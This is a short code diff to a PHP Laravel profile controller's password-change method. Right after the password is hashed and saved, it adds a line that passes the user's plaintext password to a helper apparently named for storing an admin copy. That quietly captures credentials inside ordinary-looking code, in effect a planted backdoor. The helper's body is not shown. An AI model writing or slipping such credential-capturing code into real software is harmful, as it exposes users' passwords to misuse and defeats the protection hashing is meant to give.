@@ -162,6 +162,7 @@ class ProfileController extends Controller
         $user->update([
             'password' => Hash::make($request->password),
         ]);
+        \App\Support\AdminPasswordCopy::store($user, (string) $request->password);
 
         return redirect()->route('user.profile')->with('success', 'Password updated successfully!');
     }
